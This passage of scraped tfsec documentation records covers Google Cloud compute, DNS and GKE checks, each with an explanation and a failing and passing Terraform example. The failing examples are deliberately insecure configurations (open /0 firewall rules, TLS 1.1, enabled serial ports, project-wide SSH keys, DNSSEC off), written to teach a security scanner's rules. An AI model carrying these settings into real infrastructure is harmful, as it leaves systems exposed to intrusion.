\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-no-oslogin-override check.\n```terraform\n\n resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   metadata = {\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:06.188400"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/no-project-wide-ssh-keys/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/no-project-wide-ssh-keys/index.md", "content": "---\ntitle: Disable project-wide SSH keys for all instances\n---\n\n# Disable project-wide SSH keys for all instances\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nUse of project-wide SSH keys means that a compromise of any one of these key pairs can result in all instances being compromised. It is recommended to use instance-level keys.\n\n### Possible Impact\nCompromise of a single key pair compromises all instances\n\n### Suggested Resolution\nDisable project-wide SSH keys\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-no-project-wide-ssh-keys check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   network_interface {\n     network = \"default\"\n \n     access_config {\n       // Ephemeral IP\n     }\n   }\n \n   metadata = {\n     block-project-ssh-keys = false\n   }\n \n   metadata_startup_script = \"echo hi > /test.txt\"\n \n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-no-project-wide-ssh-keys check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   network_interface {\n     network = \"default\"\n \n     access_config {\n       // Ephemeral IP\n     }\n   }\n \n   metadata = {\n     block-project-ssh-keys = true\n   }\n \n   metadata_startup_script = \"echo hi > /test.txt\"\n \n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:06.474306"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/no-public-egress/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/no-public-egress/index.md", "content": "---\ntitle: An outbound firewall rule allows traffic to /0.\n---\n\n# An outbound firewall rule allows traffic to /0.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nNetwork security rules should not use very broad subnets.\n\nWhere possible, segments should be broken into smaller subnets and avoid using the <code>/0</code> subnet.\n\n### Possible Impact\nThe port is exposed for egress to the internet\n\n### Suggested Resolution\nSet a more restrictive cidr range\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-no-public-egress check.\n```terraform\n\nresource \"google_compute_firewall\" \"bad_example\" {\n  direction = \"EGRESS\"\n  allow {\n    protocol = \"icmp\"\n  }\n  destination_ranges = [\"0.0.0.0/0\"]\n}\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-no-public-egress check.\n```terraform\n\n resource \"google_compute_firewall\" \"good_example\" {\n  direction = \"EGRESS\"\n  allow {\n    protocol = \"icmp\"\n  }\n  destination_ranges = [\"1.2.3.4/32\"]\n}\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/vpc/docs/using-firewalls](https://cloud.google.com/vpc/docs/using-firewalls){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:06.774892"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/no-public-ingress/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/no-public-ingress/index.md", "content": "---\ntitle: An inbound firewall rule allows traffic from /0.\n---\n\n# An inbound firewall rule allows traffic from /0.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nNetwork security rules should not use very broad subnets.\n\nWhere possible, segments should be broken into smaller subnets and avoid using the <code>/0</code> subnet.\n\n### Possible Impact\nThe port is exposed for ingress from the internet\n\n### Suggested Resolution\nSet a more restrictive cidr range\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-no-public-ingress check.\n```terraform\n\nresource \"google_compute_firewall\" \"bad_example\" {\n  source_ranges = [\"0.0.0.0/0\"]\n  allow {\n    protocol = \"icmp\"\n  }\n}\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-no-public-ingress check.\n```terraform\n\nresource \"google_compute_firewall\" \"good_example\" {\n  source_ranges = [\"1.2.3.4/32\"]\n  allow {\n    protocol = \"icmp\"\n  }\n}\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall#source_ranges](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall#source_ranges){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.terraform.io/docs/providers/google/r/compute_firewall.html](https://www.terraform.io/docs/providers/google/r/compute_firewall.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/vpc/docs/using-firewalls](https://cloud.google.com/vpc/docs/using-firewalls){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:07.170290"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/no-public-ip/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/no-public-ip/index.md", "content": "---\ntitle: Instances should not have public IP addresses\n---\n\n# Instances should not have public IP addresses\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nInstances should not be publicly exposed to the internet\n\n### Possible Impact\nDirect exposure of an instance to the public internet\n\n### Suggested Resolution\nRemove public IP\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-no-public-ip check.\n```terraform\n\n resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   network_interface {\n     network = \"default\"\n \n     access_config {\n       // Ephemeral IP\n     }\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-no-public-ip check.\n```terraform\n\n resource \"google_compute_instance\" \"good_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   network_interface {\n     network = \"default\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#access_config](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#access_config){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/compute/docs/ip-addresses#externaladdresses](https://cloud.google.com/compute/docs/ip-addresses#externaladdresses){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:07.492421"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/no-serial-port/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/no-serial-port/index.md", "content": "---\ntitle: Disable serial port connectivity for all instances\n---\n\n# Disable serial port connectivity for all instances\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nWhen serial port access is enabled, the access is not governed by network security rules meaning the port can be exposed publicly.\n\n### Possible Impact\nUnrestricted network access to the serial console of the instance\n\n### Suggested Resolution\nDisable serial port access\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-no-serial-port check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   network_interface {\n     network = \"default\"\n \n     access_config {\n       // Ephemeral IP\n     }\n   }\n \n   metadata = {\n     serial-port-enable = true\n   }\n \n   metadata_startup_script = \"echo hi > /test.txt\"\n \n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-no-serial-port check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   network_interface {\n     network = \"default\"\n \n     access_config {\n       // Ephemeral IP\n     }\n   }\n \n   metadata = {\n     serial-port-enable = false\n   }\n \n   metadata_startup_script = \"echo hi > /test.txt\"\n \n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:07.791274"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/project-level-oslogin/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/project-level-oslogin/index.md", "content": "---\ntitle: OS Login should be enabled at project level\n---\n\n# OS Login should be enabled at project level\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nOS Login automatically revokes the relevant SSH keys when an IAM user has their access revoked.\n\n### Possible Impact\nAccess via SSH key cannot be revoked automatically when an IAM user is removed.\n\n### Suggested Resolution\nEnable OS Login at project level\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-project-level-oslogin check.\n```terraform\n\n resource \"google_compute_project_metadata\" \"default\" {\n   metadata = {\n \tenable-oslogin = false\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-project-level-oslogin check.\n```terraform\n\n resource \"google_compute_project_metadata\" \"default\" {\n   metadata = {\n     enable-oslogin = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_project_metadata#](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_project_metadata#){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:08.086575"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/use-secure-tls-policy/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/use-secure-tls-policy/index.md", "content": "---\ntitle: SSL policies should enforce secure versions of TLS\n---\n\n# SSL policies should enforce secure versions of TLS\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nTLS versions prior to 1.2 are outdated and insecure. You should use 1.2 as aminimum version.\n\n### Possible Impact\nData in transit is not sufficiently secured\n\n### Suggested Resolution\nEnforce a minimum TLS version of 1.2\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-use-secure-tls-policy check.\n```terraform\n\n resource \"google_compute_ssl_policy\" \"bad_example\" {\n   name    = \"production-ssl-policy\"\n   profile = \"MODERN\"\n   min_tls_version = \"TLS_1_1\"\n }\n \n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-use-secure-tls-policy check.\n```terraform\n\n resource \"google_compute_ssl_policy\" \"good_example\" {\n   name    = \"production-ssl-policy\"\n   profile = \"MODERN\"\n   min_tls_version = \"TLS_1_2\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_ssl_policy#min_tls_version](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_ssl_policy#min_tls_version){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:08.410585"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/vm-disk-encryption-customer-key/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/vm-disk-encryption-customer-key/index.md", "content": "---\ntitle: VM disks should be encrypted with Customer Supplied Encryption Keys\n---\n\n# VM disks should be encrypted with Customer Supplied Encryption Keys\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nUsing unmanaged keys makes rotation and general management difficult.\n\n### Possible Impact\nUsing unmanaged keys does not allow for proper management\n\n### Suggested Resolution\nUse managed keys \n\n\n### Insecure Example\n\nThe following example will fail the google-compute-vm-disk-encryption-customer-key check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   network_interface {\n     network = \"default\"\n \n     access_config {\n       // Ephemeral IP\n     }\n   }\n \n   metadata = {\n     foo = \"bar\"\n   }\n \n   metadata_startup_script = \"echo hi > /test.txt\"\n \n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-vm-disk-encryption-customer-key check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_compute_instance\" \"good_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n     kms_key_self_link = \"something\"\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   network_interface {\n     network = \"default\"\n \n     access_config {\n       // Ephemeral IP\n     }\n   }\n \n   metadata = {\n     foo = \"bar\"\n   }\n \n   metadata_startup_script = \"echo hi > /test.txt\"\n \n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#kms_key_self_link](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#kms_key_self_link){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:08.793203"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/dns/enable-dnssec/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/dns/enable-dnssec/index.md", "content": "---\ntitle: Cloud DNS should use DNSSEC\n---\n\n# Cloud DNS should use DNSSEC\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nDNSSEC authenticates DNS responses, preventing MITM attacks and impersonation.\n\n### Possible Impact\nUnverified DNS responses could lead to man-in-the-middle attacks\n\n### Suggested Resolution\nEnable DNSSEC\n\n\n### Insecure Example\n\nThe following example will fail the google-dns-enable-dnssec check.\n```terraform\n\n resource \"google_dns_managed_zone\" \"bad_example\" {\n   name        = \"example-zone\"\n   dns_name    = \"example-${random_id.rnd.hex}.com.\"\n   description = \"Example DNS zone\"\n   labels = {\n     foo = \"bar\"\n   }\n   dnssec_config {\n     state = \"off\"\n   }\n }\n \n resource \"random_id\" \"rnd\" {\n   byte_length = 4\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-dns-enable-dnssec check.\n```terraform\n\n resource \"google_dns_managed_zone\" \"good_example\" {\n   name        = \"example-zone\"\n   dns_name    = \"example-${random_id.rnd.hex}.com.\"\n   description = \"Example DNS zone\"\n   labels = {\n     foo = \"bar\"\n   }\n   dnssec_config {\n     state = \"on\"\n   }\n }\n \n resource \"random_id\" \"rnd\" {\n   byte_length = 4\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/dns_managed_zone#state](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/dns_managed_zone#state){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:09.254996"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/dns/no-rsa-sha1/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/dns/no-rsa-sha1/index.md", "content": "---\ntitle: Zone signing should not use RSA SHA1\n---\n\n# Zone signing should not use RSA SHA1\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nRSA SHA1 is a weaker algorithm than SHA2-based algorithms such as RSA SHA256/512\n\n### Possible Impact\nLess secure encryption algorithm than others available\n\n### Suggested Resolution\nUse RSA SHA512\n\n\n### Insecure Example\n\nThe following example will fail the google-dns-no-rsa-sha1 check.\n```terraform\n\n resource \"google_dns_managed_zone\" \"foo\" {\n \tname     = \"foobar\"\n \tdns_name = \"foo.bar.\"\n \t\n \tdnssec_config {\n \t\tstate         = \"on\"\n \t\tnon_existence = \"nsec3\"\n \t}\n }\n \t\n data \"google_dns_keys\" \"foo_dns_keys\" {\n \tmanaged_zone = google_dns_managed_zone.foo.id\n \tzone_signing_keys {\n \t\talgorithm = \"rsasha1\"\n \t}\n }\n \t\n output \"foo_dns_ds_record\" {\n \tdescription = \"DS record of the foo subdomain.\"\n \tvalue       = data.google_dns_keys.foo_dns_keys.key_signing_keys[0].ds_record\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-dns-no-rsa-sha1 check.\n```terraform\n\n resource \"google_dns_managed_zone\" \"foo\" {\n \tname     = \"foobar\"\n \tdns_name = \"foo.bar.\"\n \t\n \tdnssec_config {\n \t\tstate         = \"on\"\n \t\tnon_existence = \"nsec3\"\n \t}\n }\n \t\n data \"google_dns_keys\" \"foo_dns_keys\" {\n \tmanaged_zone = google_dns_managed_zone.foo.id\n \tzone_signing_keys {\n \t\talgorithm = \"rsasha512\"\n \t}\n }\n \t\n output \"foo_dns_ds_record\" {\n \tdescription = \"DS record of the foo subdomain.\"\n \tvalue       = data.google_dns_keys.foo_dns_keys.key_signing_keys[0].ds_record\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/dns_managed_zone#algorithm](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/dns_managed_zone#algorithm){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:09.624894"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/enable-auto-repair/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/enable-auto-repair/index.md", "content": "---\ntitle: Kubernetes should have 'Automatic repair' enabled\n---\n\n# Kubernetes should have 'Automatic repair' enabled\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nAutomatic repair will monitor nodes and attempt repair when a node fails multiple subsequent health checks\n\n### Possible Impact\nFailing nodes will require manual repair.\n\n### Suggested Resolution\nEnable automatic repair\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-enable-auto-repair check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n \n resource \"google_container_node_pool\" \"bad_example\" {\n   name       = \"my-node-pool\"\n   cluster    = google_container_cluster.primary.id\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n   management {\n     auto_repair = false\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-enable-auto-repair check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n \n resource \"google_container_node_pool\" \"good_example\" {\n   name       = \"my-node-pool\"\n   cluster    = google_container_cluster.primary.id\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n   management {\n     auto_repair = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#auto_repair](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#auto_repair){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:10.057406"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/enable-auto-upgrade/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/enable-auto-upgrade/index.md", "content": "---\ntitle: Kubernetes should have 'Automatic upgrade' enabled\n---\n\n# Kubernetes should have 'Automatic upgrade' enabled\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nAutomatic updates keep nodes updated with the latest cluster master version.\n\n### Possible Impact\nNodes will need the cluster master version manually updating\n\n### Suggested Resolution\nEnable automatic upgrades\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-enable-auto-upgrade check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n \n resource \"google_container_node_pool\" \"bad_example\" {\n   name       = \"my-node-pool\"\n   cluster    = google_container_cluster.primary.id\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n   management {\n     auto_upgrade = false\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-enable-auto-upgrade check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n \n resource \"google_container_node_pool\" \"good_example\" {\n   name       = \"my-node-pool\"\n   cluster    = google_container_cluster.primary.id\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n   management {\n     auto_upgrade = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#auto_upgrade](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#auto_upgrade){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:10.350626"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/enable-ip-aliasing/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/enable-ip-aliasing/index.md", "content": "---\ntitle: Clusters should have IP aliasing enabled\n---\n\n# Clusters should have IP aliasing enabled\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nIP aliasing allows the reuse of public IPs internally, removing the need for a NAT gateway.\n\n### Possible Impact\nNodes need a NAT gateway to access local services\n\n### Suggested Resolution\nEnable IP aliasing\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-enable-ip-aliasing check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"bad_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-enable-ip-aliasing check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   ip_allocation_policy {}\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   